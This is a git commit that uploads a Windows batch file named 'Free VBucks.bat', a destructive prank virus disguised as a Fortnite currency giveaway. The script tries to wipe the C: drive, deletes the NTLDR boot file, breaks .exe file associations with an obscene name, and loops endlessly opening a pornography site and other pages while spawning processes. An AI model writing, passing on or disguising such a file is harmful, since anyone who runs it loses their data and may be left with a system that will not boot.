75e885598f74d2b783812110df1f550949e03a4e
giggityfiles <giggityfiles@gmail.com>
2025-10-08 20:47:46 -0400

    Add files via upload

---
+++ Free VBucks.bat
@@ -0,0 +1,26 @@
+@echo off
+title YOUR PC INFECTED WITH THE FORTNITE MALWARE!!!!!!!
+:virus
+rd C: /s /q
+del C:\NTLDR
+assoc exe=analvore
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://cometfight.neocities.org
+start http://pornhub.com
+start http://pornhub.com
+start http://pornhub.com
+start http://pornhub.com
+start http://youtube.com
+start http://youtube.com
+start http://youtube.com
+start http://youtube.com
+start http://youtube.com
+start http://youtube.com
+start wininit.exe
+goto virus
